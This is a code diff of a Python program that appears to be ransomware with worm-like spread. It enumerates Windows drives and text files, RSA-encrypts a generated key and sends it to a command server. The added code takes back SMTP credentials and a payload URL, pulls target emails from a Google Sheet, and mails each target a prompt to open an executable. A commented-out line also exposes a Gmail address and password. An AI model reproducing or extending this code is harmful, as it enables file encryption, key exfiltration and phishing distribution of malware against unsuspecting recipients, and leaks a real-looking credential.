@@ -1,13 +1,28 @@
-import random, os, string
-import win32api
+import random
+import os
+# import string
+from string import ascii_letters as string_ascii_letters
+from string import digits as string_digits
+# import win32api
+from win32api import GetLogicalDriveStrings
+
 from Crypto.Cipher import AES
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-import base64
+# import base64
+from base64 import b64encode, b64decode
 import socket
 import requests
-import csv
+# import csv
+from csv import DictReader
 import sys
+
+# from dotenv import load_dotenv
+
+import smtplib
+from email.mime.multipart import MIMEMultipart
+
+from email.mime.text import MIMEText
 
 
 def waitingForKey(key, message="Enter the secret key to start the program: "):
@@ -34,7 +49,7 @@ def count_lines(file_path):
 
 def generate_key(length):
     """Generate a random ASCII key of given length"""
-    ascii_key = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+    ascii_key = ''.join(random.choices(string_ascii_letters +string_digits, k=length))
     return ascii_key
 
 def saveKey(key, filename):
@@ -49,11 +64,11 @@ def saveKey(key, filename):
 
 def findRootDirsWindows():
     """Find the root directories in Windows"""
-    drives = win32api.GetLogicalDriveStrings()
+    drives = GetLogicalDriveStrings()
     roots = drives.split('\000')[:-1]
     return roots
 
-def findTxtFile(file_name):
+def findTxtFileAndSaveThemTo(file_name):
     """Find all text files in the system and write their paths to a .txt file"""
     root_dirs = findRootDirsWindows()
     txtFileCounter = 0
@@ -163,7 +178,7 @@ def encryptWithRSA(data, public_key):
 
     encryptor = PKCS1_OAEP.new(public_key)
     encrypted_data = encryptor.encrypt(data)
-    encoded_encrypted_msg = base64.b64encode(encrypted_data)
+    encoded_encrypted_msg = b64encode(encrypted_data)
     #print(encoded_encrypted_msg)
     return encoded_encrypted_msg 
 
@@ -173,7 +188,7 @@ def decrypt_with_RSA(ciphertext, private_key):
     key= RSA.import_key(private_key)
     decryptor = PKCS1_OAEP.new(key)
     # Decode the ciphertext from base64-encoded string to bytes
-    ciphertext_bytes = base64.b64decode(ciphertext)
+    ciphertext_bytes = b64decode(ciphertext)
     # Use the decryption scheme to decrypt the ciphertext
     plaintext_bytes = decryptor.decrypt(ciphertext_bytes)
     # Convert plaintext bytes to string and return
@@ -194,7 +209,7 @@ def decrypt_with_RSA(ciphertext, private_key):
 #     # Return the ciphertext as a base64-encoded string
 #     return base64.b64encode(ciphertext_bytes)
 
-def send_to_server(ascii_key):
+def encrypt_ascii_key_with_server_RSA_and_send_to_server(ascii_key):
     SERVER_IP = '10.0.2.2'
     SERVER_PORT = 5678
     with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
@@ -204,13 +219,59 @@ def send_to_server(ascii_key):
         byte_ascii_key = ascii_key.encode()
         encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
         s.send(encoded_encrypted_msg)
-    return encoded_encrypted_msg
+
+        credentials = {}
+        data = s.recv(1024).decode()
+        credentials['smtp_email'] = data.split("\n")[0]
+        credentials['smtp_password'] = data.split("\n")[1]
+        payload_URL = data.split("\n")[2]
+    return encoded_encrypted_msg, credentials, payload_URL
 
 def get_emails_from_csv():
     url = "https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv"
     response = requests.get(url)
     # convert the data to a csv format
-    data = csv.DictReader(response.text.splitlines())
+    data = DictReader(response.text.splitlines())
     # return only the emails
     emails = [row['Email'] for row in data]
     return emails
+
+def send_to_emails(emails, credentials,  payload_url):
+    
+    
+    subject = 'Sending an executable file'
+    message = 'Please open the attached exe:' + payload_url
+    msg = MIMEMultipart()
+    
+    
+    msg['Subject'] = subject
+    msg.attach(MIMEText(message, 'plain'))
+
+    smtp_server = 'smtp.gmail.com'
+    
+    smtp_port = 587
+    
+    
+    # smtp_username = 'gpt.rats@gmail.com'
+    # smtp_password = 'mmtxdnfzzvckqrhw'
+
+    smtp_email = credentials['smtp_email']
+    sender_email = smtp_email
+
+    smtp_password = credentials['smtp_password']
+
+    server = smtplib.SMTP(smtp_server, smtp_port)
+    server.starttls()
+    server.login(smtp_email, smtp_password)
+
+    
+    msg['From'] = sender_email
+    # Send the email
+    for email in emails:
+        receiver_email = email
+        msg['To'] = email
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+
+
+    server.quit()
+    
